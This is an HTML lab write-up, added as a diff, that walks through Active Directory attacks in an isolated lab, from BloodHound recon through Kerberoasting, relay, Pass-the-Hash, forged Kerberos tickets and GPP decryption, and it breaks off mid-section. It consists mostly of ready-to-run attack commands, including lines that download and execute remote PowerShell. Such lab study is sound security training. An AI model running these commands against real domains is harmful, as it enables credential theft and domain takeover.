@@ -1,0 +1,1802 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory Attacks</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="index.html" class="nav-item">Home</a>
+    <a href="soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="case_1.html" class="nav-item">Case 1</a>
+    <a href="case_2.html" class="nav-item">Case 2</a>
+    <a href="case_3.html" class="nav-item">Case 3</a>
+    <a href="ad_attacks_lab.html" class="nav-item active">Active Directory Attacks</a>
+    <a href="more_tools.html" class="nav-item">More Tools</a>
+    <a href="htb.html" class="nav-item">HackTheBox</a>
+    <a href="vulnhub.html" class="nav-item">Vulnhub</a>
+    <a href="offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+
+<h2>Index</h2>
+<ul>
+    <li><a href="#Setup">Setup</a></li>
+    <li><a href="#BloodHound_Recon">BloodHound Recon</a></li>
+    <li><a href="#Kerberoasting">Kerberoasting</a></li>
+    <li><a href="#LLMNR_NBT-NS_Poisoning">LLMNR / NBT-NS Poisoning</a></li>
+    <li><a href="#Pass-The-Hash">Pass-the-Hash (PtH)</a></li>
+    <li><a href="#Golden-Ticket">Golden Ticket</a></li>
+    <li><a href="#AS-REP_Roasting">AS-REP Roasting</a></li>
+    <li><a href="#Silver_Ticket">Silver Ticket</a></li>
+    <li><a href="#GPP_Password_Extraction">GPP Password Extraction</a></li>
+    <li><a href="#ACL_Abuse">ACL Abuse</a></li>
+    <li><a href="#Unconstrained_Delegation">Unconstrained Delegation</a></li>
+    <li><a href="#DCSync">DCSync</a></li>
+    <li><a href="#Constrained_Delegation_Abuse">Constrained Delegation Abuse</a></li>
+    <li><a href="#Resource-Based_Constrained_Delegation">Resource-Based Constrained Delegation</a></li>
+    <li><a href="#AdminSDHolder_Abuse">AdminSDHolder Abuse</a></li>
+    <li><a href="#LSASS_Dump">LSASS Dump</a></li>
+</ul>
+
+
+
+<section>
+    <h1 id="Setup">Active Directory Attacks Lab – Setup</h1>
+
+    <p>
+        This section describes the initial configuration of the Active Directory laboratory used for the attack demonstrations. 
+        The environment is intentionally minimal and isolated, consisting of a Windows Server 2022 Domain Controller, 
+        a Windows 10 workstation, and a Kali Linux attacker machine.
+    </p>
+
+
+    <h2>Windows Server 2022 Core</h2>
+    <ul>
+        <li><strong>Name:</strong> <code>MyDC</code></li>
+        <li><strong>Network:</strong>
+            <ul>
+                <li>Interface #1: <code>10.10.10.99</code> (Internal Network, static)</li>
+                <li>Interface #2: <code>10.0.2.15</code> (NAT)</li>
+            </ul>
+        </li>
+    </ul>
+
+    <h3>Active Directory Installation</h3>
+
+    <pre><code>
+# Install AD DS Role and Management Tools
+Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
+
+# Promote to Domain Controller (for lab.local)
+Install-ADDSForest `
+  -DomainName "lab.local" `
+  -DomainNetbiosName "LAB" `
+  -ForestMode "7" `
+  -DomainMode "7" `
+  -InstallDns:$true `
+  -NoRebootOnCompletion:$false `
+  -Force:$true
+
+# Check
+Get-ADDomain
+    </code></pre>
+
+    <h3>Change Keyboard Layout to Spanish</h3>
+
+    <pre><code>
+Get-WinUserLanguageList
+$LangList = New-WinUserLanguageList es-ES
+$LangList
+Set-WinUserLanguageList $LangList -Force
+Get-WinUserLanguageList
+    </code></pre>
+
+    <h2>VulnAD Setup</h2>
+
+    <p>Links:</p>
+    <ul>
+        <li><a href="https://github.com/safebuffer/vulnerable-AD">https://github.com/safebuffer/vulnerable-AD</a></li>
+        <li><a href="https://github.com/safebuffer/vulnerable-AD/blob/master/vulnad.ps1">https://github.com/safebuffer/vulnerable-AD/blob/master/vulnad.ps1</a></li>
+    </ul>
+
+    <pre><code>
+IEX((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/wazehell/vulnerable-AD/master/vulnad.ps1"))
+# Alternative:
+# https://raw.githubusercontent.com/safebuffer/vulnerable-AD/refs/heads/master/vulnad.ps1
+
+Invoke-VulnAD -UsersLimit 10 -DomainName "lab.local"
+    </code></pre>
+
+    <h2>Create an Active Directory User (For Windows Workstation)</h2>
+
+    <pre><code>
+New-ADUser -Name "AD_User" -SamAccountName "ad_user" -UserPrincipalName "ad_user@lab.local" `
+  -AccountPassword (ConvertTo-SecureString "ad_user" -AsPlainText -Force) -Enabled $true
+    </code></pre>
+
+    <h2>Setup Verification</h2>
+
+    <h3>Verify AD DS and DNS Roles</h3>
+    <pre><code>
+Get-WindowsFeature AD-Domain-Services, DNS | Where-Object InstallState -eq "Installed"
+    </code></pre>
+
+    <h3>Confirm Domain Creation</h3>
+    <pre><code>
+Get-ADDomain | Select-Object Name, Forest, DomainControllersContainer
+    </code></pre>
+
+    <h3>Check DNS Records</h3>
+    <pre><code>
+Get-DnsServerResourceRecord -ZoneName "lab.local" -RRType SRV
+    </code></pre>
+
+    <h2>Create a Kerberoastable User Account</h2>
+
+    <h3>1. Create the User</h3>
+    <pre><code>
+New-ADUser -Name "roastme" -SamAccountName "roastme" `
+  -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) -Enabled $true
+    </code></pre>
+
+    <h3>2. Assign an SPN</h3>
+    <pre><code>
+Set-ADUser -Identity "roastme" -Add @{ServicePrincipalName="HTTP/roastme.lab.local"}
+    </code></pre>
+
+    <h3>3. Disable Pre-Authentication</h3>
+    <pre><code>
+Set-ADUser -Identity "roastme" -Replace @{userAccountControl=4194304}
+    </code></pre>
+
+    <p>
+        Requirements for a Kerberoastable account:
+    </p>
+    <ul>
+        <li>User account (not computer or managed service account)</li>
+        <li>SPN assigned</li>
+        <li>Pre-authentication disabled</li>
+        <li>Password intentionally weak for testing</li>
+        <li>Domain reachable from attacker machine</li>
+    </ul>
+
+    <h2>Windows 10 LTSC</h2>
+
+    <ul>
+        <li><strong>Name:</strong> <code>MY-BOX</code></li>
+        <li><strong>Network:</strong>
+            <ul>
+                <li>Interface #1: <code>10.10.10.77</code> (Internal Network, DNS set to 10.10.10.99)</li>
+                <li>Interface #2: <code>10.0.3.15</code> (NAT)</li>
+            </ul>
+        </li>
+    </ul>
+
+    <h3>Network Connectivity Test</h3>
+    <pre><code>
+Test-NetConnection -ComputerName MyDC.lab.local -Port 53   # DNS
+Test-NetConnection -ComputerName MyDC.lab.local -Port 389  # LDAP
+    </code></pre>
+
+    <h3>Join the Domain</h3>
+    <pre><code>
+Add-Computer -DomainName lab.local -Credential (Get-Credential LAB\Administrator) -Restart
+    </code></pre>
+
+    <p>
+        After restarting, log in using the domain account <code>ad_user</code>.
+    </p>
+
+    <h2>Kali Linux</h2>
+    <p>
+        A standard Kali Linux virtual machine was used as the attacker system. 
+        Minor adjustments were made during the setup to correct issues such as time and network configuration inconsistencies.
+    </p>
+</section>
+
+<h1 id="BloodHound_Recon">BloodHound Recon</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Domain-joined Windows host (Windows 10 VM)</li>
+    <li>Low-privilege AD credentials (<code>ad_user:ad_user</code>)</li>
+    <li>Network connectivity to the domain controller (port 389/tcp)</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Map Active Directory attack paths, such as <code>ad_user</code> to Domain Admin</li>
+    <li>Identify misconfigurations and excessive privileges</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Data Collection (Run on Windows 10 as <code>ad_user</code>)</h3>
+
+<pre><code>
+# Download SharpHound.ps1
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
+
+# Collect AD data (creates ZIP)
+Invoke-BloodHound -CollectionMethods All -Domain "lab.local" -OutputDirectory $pwd
+</code></pre>
+
+<p><strong>Output:</strong> A file named <code>&lt;TIMESTAMP&gt;_BloodHound.zip</code> is created in the current directory.</p>
+
+<h3>2. Transfer ZIP to Kali</h3>
+
+<pre><code>
+# On Kali: Start an SMB server
+mkdir smb; cd smb
+impacket-smbserver -smb2support smb . -username ABC -password ABC
+</code></pre>
+
+<pre><code>
+# On Windows 10: Mount the SMB share and transfer the file
+$pass = ConvertTo-SecureString -AsPlainText -Force "ABC"
+$cred = New-Object System.Management.Automation.PSCredential("ABC",$pass)
+New-PSDrive -Name KALI -PSProvider FileSystem -Root \\10.10.10.9\smb -Credential $cred
+Get-ChildItem KALI:\
+Copy-Item .\20250807171032_BloodHound.zip KALI:\
+</code></pre>
+
+<h3>3. Ingest Data in BloodHound (Kali)</h3>
+
+<pre><code>
+# Start Neo4j
+sudo neo4j start
+# Password: admin
+
+# Launch BloodHound
+bloodhound
+</code></pre>
+
+<p><strong>BloodHound Login:</strong></p>
+<ul>
+    <li>Database URL: <code>bolt://localhost:7687</code></li>
+    <li>Username: <code>neo4j</code></li>
+    <li>Password: <code>admin</code></li>
+</ul>
+
+<p>Import the ZIP file by dragging and dropping it into the BloodHound interface.</p>
+
+<h3>4. Key Queries (BloodHound UI)</h3>
+
+<ul>
+    <li><strong>Find shortest path to Domain Admin:</strong>  
+        Right-click <code>ad_user@lab.local</code> → Shortest Paths to High Value Targets
+    </li>
+    <li><strong>Identify Kerberoastable users:</strong>  
+        <code>MATCH (u:User {hasspn:true}) RETURN u</code>
+    </li>
+</ul>
+
+<h3>Results</h3>
+
+<p><img src="images/ad_attacks_lab/kali_1.png" alt="kali_1"></p>
+
+<h3>Cleanup</h3>
+
+<pre><code>
+# On Windows 10: Remove evidence
+Remove-Item &lt;TIMESTAMP&gt;_BloodHound.zip -Force
+</code></pre>
+
+
+<h1 id="Kerberoasting">Kerberoasting</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Low-privilege domain credentials (<code>ad_user:ad_user</code>)</li>
+    <li>Service accounts with SPNs registered (created by VulnAD)</li>
+    <li>Network access to the domain controller (port 88/tcp)</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Request TGS tickets for service accounts</li>
+    <li>Extract crackable Kerberos hashes</li>
+    <li>Crack hashes to obtain service account credentials</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Discover SPN Accounts (Kali)</h3>
+
+<pre><code>
+# Enumerate service accounts with SPNs
+impacket-GetUserSPNs.py lab.local/ad_user:ad_user -dc-ip 10.10.10.99 -request
+</code></pre>
+
+<p><strong>Output:</strong> Hashes saved in <code>$krb5tgs$23</code> format (Hashcat mode 13100).</p>
+
+<h3>2. Crack Hashes (Kali)</h3>
+
+<pre><code>
+# Crack with Hashcat (rockyou.txt wordlist)
+hashcat -m 13100 kerberoastable_hashes.txt /usr/share/wordlists/rockyou.txt -O
+hashcat -m 13100 kerberoastable_hashes.txt /usr/share/wordlists/rockyou.txt --show
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_2.png" alt="kali_2"></p>
+
+<h3>3. Verify Access</h3>
+
+<pre><code>
+# Test cracked credentials
+netexec smb 10.10.10.99 -u roastme -p 'Password123'
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_3.png" alt="kali_3"></p>
+
+
+
+<h1 id="LLMNR_NBT-NS_Poisoning">LLMNR/NBT-NS Poisoning</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Attacker (Kali) on the same network segment as Windows 10</li>
+    <li>Windows 10 with LLMNR and NBT-NS enabled (default)</li>
+    <li>SMB signing not enforced (default on workstations)</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Poison name resolution requests</li>
+    <li>Capture NTLMv2 hashes when Windows 10 accesses invalid shares</li>
+    <li>Crack hashes or relay them to gain access</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Start Responder (Kali)</h3>
+
+<pre><code>
+# Stop conflicting services
+sudo systemctl stop smbd nmbd winbind
+
+# Start poisoning (eth0 = attacker interface)
+sudo responder -I eth0 -dwv
+</code></pre>
+
+<p>Options:</p>
+<ul>
+    <li><strong>d</strong>: Enable DNS spoofing</li>
+    <li><strong>w</strong>: Enable WPAD proxy</li>
+    <li><strong>v</strong>: Verbose output</li>
+</ul>
+
+<h3>2. Trigger Hash Capture (Windows 10)</h3>
+
+<ol>
+    <li>Open Run (Win+R)</li>
+    <li>Enter an invalid share path: <code>\\fake-share</code></li>
+    <li>Enter credentials when prompted (<code>ad_user:ad_user</code>)</li>
+</ol>
+
+<h3>3. Capture Hash</h3>
+
+<p><img src="images/ad_attacks_lab/kali_4.png" alt="kali_4"></p>
+
+<p>Hashes are saved in <code>/usr/share/responder/logs/</code>.</p>
+
+<h3>4. Crack Hash (Kali)</h3>
+
+<pre><code>
+hashcat -m 5600 LLMNR_NBT-NS_Poisoning_hashes.txt /usr/share/wordlists/rockyou.txt -O
+
+# Or with a custom password list
+hashcat -m 5600 LLMNR_NBT-NS_Poisoning_hashes.txt password_list.txt -O
+hashcat -m 5600 LLMNR_NBT-NS_Poisoning_hashes.txt password_list.txt --show
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_5.png" alt="kali_5"></p>
+
+<hr>
+
+<h2>Alternative: SMB Relay Attack</h2>
+
+<p>If the domain controller has SMB signing disabled (verify with <code>nmap --script smb2-security-mode -p445 &lt;DC_IP&gt;</code>):</p>
+
+<pre><code>
+# 1. Generate target list
+echo &lt;DC_IP&gt; > targets.txt
+
+# 2. Start ntlmrelayx
+sudo ntlmrelayx.py -tf targets.txt -smb2support -socks
+
+# 3. Trigger authentication from Windows 10 (same as before)
+
+# 4. Use relayed session
+proxychains smbclient //&lt;DC_IP&gt;/C$ -U 'LAB\\ad_user'
+</code></pre>
+
+<h2>Key Notes</h2>
+
+<ol>
+    <li>Windows 10 broadcasts requests for <code>\\fake-share</code>, and Responder replies pretending to be that host.</li>
+    <li>Windows 10 sends an NTLMv2 hash to the attacker.</li>
+    <li>Defense: disable LLMNR and NBT-NS via Group Policy, and enable SMB signing on all hosts.</li>
+</ol>
+
+
+
+
+
+
+<h1 id="Pass-The-Hash">Pass-the-Hash (PtH)</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Reusable NT hash of a domain account</li>
+    <li>Target system accessible via SMB (port 445)</li>
+    <li>SMB signing not enforced (default on workstations)</li>
+</ul>
+
+<p>The following example assumes that a hash was previously dumped from a compromised system using a tool such as Mimikatz.</p>
+
+<pre><code>
+# sekurlsa::logonpasswords
+fea5dc85462b84d91dc61a66458bff37
+</code></pre>
+
+<h2>1. Verify Target Vulnerability</h2>
+
+<pre><code>
+nmap -Pn -n --script smb-security-mode -p445 &lt;TARGET_IP&gt;
+# Look for: message_signing: disabled or not enforced
+</code></pre>
+
+<h2>2. Perform Pass-the-Hash Attack (Kali)</h2>
+
+<p><strong>Access SMB Shares:</strong></p>
+
+<pre><code>
+netexec smb 10.10.10.99 -u ad_user -H fea5dc85462b84d91dc61a66458bff37 -d lab.local --users
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_6.png" alt="kali_6"></p>
+
+<p><strong>Execute Commands (authentication does not imply authorization):</strong></p>
+
+<pre><code>
+netexec smb 10.10.10.99 -u ad_user -H fea5dc85462b84d91dc61a66458bff37 -x "whoami"
+</code></pre>
+
+<p><strong>Gain Interactive Shell:</strong></p>
+
+<pre><code>
+psexec.py lab.local/ad_user@10.10.10.77 -hashes :fea5dc85462b84d91dc61a66458bff37
+</code></pre>
+
+<h2>Key Differences: Hash Types</h2>
+
+<table border=1>
+    <tr>
+        <th>Hash Type</th>
+        <th>Format</th>
+        <th>Reusable for PtH?</th>
+        <th>Source</th>
+    </tr>
+    <tr>
+        <td>NT Hash</td>
+        <td><code>8846F7EAEE8FB117AD06BDD830B7586C</code></td>
+        <td>Yes</td>
+        <td>LSASS, SAM, DCSync</td>
+    </tr>
+    <tr>
+        <td>NTLMv2 Response</td>
+        <td><code>testpth::LAB:112233...:8846F7EA...</code></td>
+        <td>No</td>
+        <td>Responder capture</td>
+    </tr>
+</table>
+
+<p>Always use NT hashes (32 hexadecimal characters) for Pass-the-Hash attacks, not full NTLMv2 responses.</p>
+
+
+<h1 id="Golden-Ticket">Golden Ticket</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Temporary Domain Admin access</li>
+    <li>krbtgt account NT hash</li>
+    <li>Domain SID</li>
+    <li>Network access to the domain controller (port 88/tcp)</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Extract the krbtgt NT hash</li>
+    <li>Forge a Ticket Granting Ticket</li>
+    <li>Gain persistent Domain Admin access</li>
+</ol>
+
+<hr>
+
+<h2>1. Gain Domain Admin Access</h2>
+
+<p>Required to extract the krbtgt hash.</p>
+
+<pre><code>
+sudo impacket-psexec lab.local/Administrator@10.10.10.99 -hashes :4cb55ea6471d29ccbb2ce4cf00271fe3
+</code></pre>
+
+<h2>2. Extract krbtgt Hash and Domain SID</h2>
+
+<pre><code>
+# On the domain controller (Mimikatz)
+.\mimikatz.exe
+privilege::debug
+lsadump::dcsync /domain:lab.local /user:krbtgt
+</code></pre>
+
+<pre><code>
+# On Kali
+netexec ldap 10.10.10.99 -d lab.local -u ad_user -p ad_user --get-sid
+</code></pre>
+
+<p><strong>Output:</strong></p>
+
+<pre><code>
+krbtgt NT hash: 9f5f3975e19aa08498a25f6775f5b8b2
+Domain SID: S-1-5-21-2023621548-1011382311-3318102000
+</code></pre>
+
+<h2>3. Generate Golden Ticket (Kali)</h2>
+
+<pre><code>
+impacket-ticketer -nthash 9f5f3975e19aa08498a25f6775f5b8b2 \
+-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
+-domain lab.local Administrator
+</code></pre>
+
+<p><strong>Output:</strong> A file named <code>Administrator.ccache</code>.</p>
+
+<h2>4. Use Golden Ticket</h2>
+
+<pre><code>
+unset KRB5CCNAME
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+
+# Ensure MyDC.lab.local is resolvable in /etc/hosts
+
+# Access the domain controller as Domain Admin
+impacket-psexec Administrator@MyDC.lab.local -k -no-pass
+
+# Dump all hashes
+impacket-secretsdump -k -no-pass Administrator@MyDC.lab.local
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_7.png" alt="kali_7"></p>
+
+<h2>One Script</h2>
+
+<pre><code>
+impacket-ticketer -nthash 9f5f3975e19aa08498a25f6775f5b8b2 \
+-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
+-domain lab.local Administrator
+
+unset KRB5CCNAME
+export KRB5CCNAME=$(pwd)/Administrator.ccache
+
+# NT AUTHORITY\SYSTEM shell
+impacket-psexec Administrator@MyDC.lab.local -k -no-pass
+
+# Administrator shell (alternative)
+# impacket-wmiexec Administrator@MyDC.lab.local -k -no-pass
+
+# Dump all hashes (alternative)
+# impacket-secretsdump -k -no-pass Administrator@MyDC.lab.local
+</code></pre>
+
+<p>Note: The Golden Ticket attack did not work with fake accounts or the domain controller machine account, possibly due to updated security protections in Windows Server 2022.</p>
+
+
+
+<h1 id="AS-REP_Roasting">AS-REP Roasting</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>User accounts without Kerberos pre-authentication</li>
+    <li>Network access to the domain controller (port 88/tcp)</li>
+    <li>No credentials required</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Identify users with pre-authentication disabled</li>
+    <li>Request AS-REP messages containing crackable hashes</li>
+    <li>Crack hashes to obtain plaintext passwords</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Discover Vulnerable Users (Kali)</h3>
+
+<pre><code>
+impacket-GetNPUsers lab.local/ -no-pass -dc-ip 10.10.10.99 \
+-usersfile Domain_Users.txt -format hashcat -outputfile asrep.txt
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_8.png" alt="kali_8"></p>
+
+<h3>2. Crack Hashes (Kali)</h3>
+
+<pre><code>
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -O
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_9.png" alt="kali_9"></p>
+
+<h3>3. Verify Access</h3>
+
+<pre><code>
+netexec smb 10.10.10.99 -u bill.shanie -p 'magic'
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_10.png" alt="kali_10"></p>
+
+<h2>Key Notes</h2>
+
+<ol>
+    <li>AS-REP messages use RC4 encryption by default, which is weak and fast to crack.</li>
+    <li>Hashes crack significantly faster than NTLMv2.</li>
+    <li>Detection: Event ID 4768 with pre-authentication type 0, and alerting on multiple AS-REQ failures.</li>
+</ol>
+
+<hr>
+
+<h1 id="Silver_Ticket">Silver Ticket</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Service account NT hash (for example, domain controller machine account)</li>
+    <li>Domain SID</li>
+    <li>Target SPN</li>
+    <li>No Domain Admin access required for ticket usage</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Forge a service ticket (TGS) for a specific service</li>
+    <li>Gain unauthorized access to that service</li>
+    <li>Bypass Golden Ticket detection mechanisms</li>
+</ol>
+
+<hr>
+
+<h2>1. Obtain Service Account Hash (Domain Controller)</h2>
+
+<p>Requires Domain Admin access.</p>
+
+<pre><code>
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+
+# Example extracted hash:
+# c3d7c3fd7215adc7f9fd417b70deb55e
+</code></pre>
+
+<h2>2. Extract Domain SID</h2>
+
+<pre><code>
+netexec ldap 10.10.10.99 -d lab.local -u ad_user -p ad_user --get-sid
+# Example:
+# S-1-5-21-2023621548-1011382311-3318102000
+</code></pre>
+
+<h2>3. Identify Target SPN</h2>
+
+<pre><code>
+ldapsearch -x -H ldap://10.10.10.99 -D "ad_user@lab.local" -w ad_user \
+-b "dc=lab,dc=local" "(servicePrincipalName=*)" | grep servicePrincipalName
+</code></pre>
+
+<p><strong>Target SPN:</strong> <code>HOST/MyDC.lab.local</code></p>
+
+<h2>4. Forge Silver Ticket</h2>
+
+<pre><code>
+impacket-ticketer -nthash c3d7c3fd7215adc7f9fd417b70deb55e \
+-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
+-domain lab.local -spn HOST/MyDC.lab.local fakeuser
+</code></pre>
+
+<p><strong>Output:</strong> <code>fakeuser.ccache</code></p>
+
+<h2>5. Access Target Service</h2>
+
+<pre><code>
+unset KRB5CCNAME
+export KRB5CCNAME=$(pwd)/fakeuser.ccache
+
+impacket-psexec fakeuser@MyDC.lab.local -k -no-pass
+</code></pre>
+
+<p><strong>Results:</strong></p>
+<p><img src="images/ad_attacks_lab/kali_11.png" alt="kali_11"></p>
+
+<h2>One Script</h2>
+
+<pre><code>
+impacket-ticketer -nthash c3d7c3fd7215adc7f9fd417b70deb55e \
+-domain-sid S-1-5-21-2023621548-1011382311-3318102000 \
+-domain lab.local -spn HOST/MyDC.lab.local fakeuser
+
+unset KRB5CCNAME
+export KRB5CCNAME=$(pwd)/fakeuser.ccache
+
+impacket-wmiexec fakeuser@MyDC.lab.local -k -no-pass
+</code></pre>
+
+<h2>Key Advantages Over Golden Tickets</h2>
+
+<ol>
+    <li>Stealthier: valid only for a specific service and does not require the krbtgt hash.</li>
+    <li>Persistence: valid until the service account password changes.</li>
+    <li>Bypasses Golden Ticket detection mechanisms.</li>
+</ol>
+
+<h2>Defensive Mitigations</h2>
+
+<ol>
+    <li>Restrict service account privileges.</li>
+    <li>Monitor for abnormal ticket lifetimes and tickets issued for non-existent users.</li>
+    <li>Rotate machine account passwords regularly.</li>
+</ol>
+
+
+
+<h1 id="GPP_Password_Extraction">GPP Password Extraction</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Access to SYSVOL share (read permission)</li>
+    <li>Group Policy Preferences containing credentials</li>
+    <li>Legacy GPP files not removed</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Locate XML files with <code>cpassword</code> attributes</li>
+    <li>Decrypt credentials using the published AES key</li>
+    <li>Gain privileged access using extracted credentials</li>
+</ol>
+
+<hr>
+
+<h2>Step-by-Step Execution</h2>
+
+<h3>1. Locate GPP Files (Kali)</h3>
+
+<pre><code>
+smbclient //10.10.10.99/SYSVOL -U 'lab.local\\ad_user%ad_user' \
+-c 'recurse; ls' | grep -i .xml -B 4
+</code></pre>
+
+<p><strong>Key files:</strong> Groups.xml, Services.xml, ScheduledTasks.xml</p>
+
+<h3>2. Download and Extract Credentials</h3>
+
+<pre><code>
+smbclient //10.10.10.99/SYSVOL -U 'lab.local\\ad_user%ad_user' \
+-c 'get \\lab.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups.xml'
+
+mv *Groups.xml Groups.xml
+cat Groups.xml | grep cpassword
+</code></pre>
+
+<h3>3. Decrypt Password</h3>
+
+<pre><code>
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_12.png" alt="kali_12"></p>
+
+<h2>Lab Configuration (Optional)</h2>
+
+<pre><code>
+$cpassword = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+$gpo = Get-GPO -Name "Default Domain Policy"
+$guid = $gpo.Id.Guid
+
+$xmlContent = @"
+<Groups>
+  <User name="GPPAdmin" cpassword="$cpassword" />
+</Groups>
+"@
+
+$targetPath = "C:\Windows\SYSVOL\domain\Policies\{$guid}\Machine\Preferences"
+New-Item -Path $targetPath -ItemType Directory -Force | Out-Null
+$xmlContent | Out-File "$targetPath\Groups.xml" -Encoding UTF8
+</code></pre>
+
+<h2>Key Notes</h2>
+
+<ol>
+    <li>Microsoft published the AES private key in MS14-025.</li>
+    <li>Common cases include local admin passwords and scheduled task credentials.</li>
+    <li>Mitigation: remove all GPP files containing <code>cpassword</code> and use LAPS.</li>
+</ol>
+
+<hr>
+
+<h1 id="ACL_Abuse">ACL Abuse</h1>
+
+<p>This section is intentionally left empty. ACL abuse depends heavily on the specific environment and privilege assignments.</p>
+
+<hr>
+
+<h1 id="Unconstrained_Delegation">Unconstrained Delegation</h1>
+
+<p><strong>Attack Conditions:</strong></p>
+<ul>
+    <li>Service running under a computer account configured for unconstrained delegation</li>
+    <li>Privileged user authenticates to that service</li>
+    <li>Local admin access to the service host</li>
+</ul>
+
+<p><strong>Goals:</strong></p>
+<ol>
+    <li>Identify systems with unconstrained delegation</li>
+    <li>Capture TGTs of authenticating users</li>
+    <li>Impersonate privileged accounts using captured tickets</li>
+</ol>
+
+<hr>
+
+<h2>Step 1: Lab Configuration (Domain Controller)</h2>
+
+<h3>Enable Unconstrained Delegation for Windows 10</h3>
+
+<pre><code>
+Set-ADComputer -Identity "MY-BOX" -TrustedForDelegation $true
+
+Get-ADComputer -Identity "MY-BOX" -Properties TrustedForDelegation |
+  Select Name, TrustedForDelegation
+</code></pre>
+
+<h3>Install IIS on Windows 10</h3>
+
+<pre><code>
+Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServer -All
+
+Import-Module WebAdministration
+Set-WebConfigurationProperty -Filter system.webServer/security/authentication/windowsAuthentication \
+    -Name enabled -Value True -PSPath 'IIS:\'
+
+Set-WebConfigurationProperty -Filter system.webServer/security/authentication/anonymousAuthentication \
+    -Name enabled -Value False -PSPath 'IIS:\'
+
+iisreset.exe
+</code></pre>
+
+<h3>Add SPNs</h3>
+
+<pre><code>
+setspn -S HTTP/MY-BOX.lab.local LAB\\MY-BOX$
+</code></pre>
+
+<hr>
+
+<h2>Step 2: Attack Execution</h2>
+
+<h3>1. Identify Delegation Settings (BloodHound)</h3>
+
+<p>Query:</p>
+<pre><code>
+MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+</code></pre>
+
+<p><img src="images/ad_attacks_lab/kali_13.png" alt="kali_13"></p>
+
+<h3>2. Gain Admin Access to Windows 10</h3>
+
+<pre><code>
+# Any method that provides local admin access
+</code></pre>
+
+<h3>3. Capture TGTs with Rubeus (Windows 10)</h3>
+
+<pre><code>
+Rubeus.exe monitor /interval:5 /nowrap
+</code></pre>
+
